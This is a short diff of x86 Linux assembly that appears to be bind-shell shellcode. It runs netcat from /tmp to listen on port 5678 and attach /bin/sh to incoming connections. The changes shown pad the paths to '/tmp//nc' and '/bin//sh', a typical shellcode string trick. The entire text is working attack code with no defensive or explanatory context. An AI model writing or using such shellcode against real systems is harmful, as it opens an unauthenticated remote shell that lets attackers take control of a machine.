@@ -10,14 +10,14 @@ global _start
 	  mov eax, 11
 	  int 0x80
 
-	  mov eax, 1
+  	mov eax, 1
 	  xor ebx, ebx
 	  int 0x80
-
+    
   section .rodata
-  filename: db "/tmp/nc", 0
+  filename: db "/tmp//nc", 0
   arg1: db "-lnp", 0
   arg2: db "5678", 0
   arg3: db "-tte", 0
-  arg4: db "/bin/sh", 0
+  arg4: db "/bin//sh", 0
   argv: dd filename, arg1, arg2, arg3, arg4, 0
